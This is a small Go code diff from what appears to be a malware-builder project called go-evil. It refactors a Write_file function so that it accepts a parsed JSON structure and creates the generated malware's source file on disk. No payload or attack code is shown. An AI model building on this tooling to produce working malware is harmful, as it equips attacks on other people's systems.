@@ -5,13 +5,12 @@ import (
 	"fmt"
 	"os"
 
-	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
 // Writes the malware go content to a local file indicated by the structure
-func Write_file(s_json string) {
-	data_object := structure.Receive(s_json)
+func Write_file(data_object *json.Json_t) {
 
 	file, err := os.Create(fmt.Sprintf("%s%s", data_object.Malware_path, data_object.Malware_src_file))
 
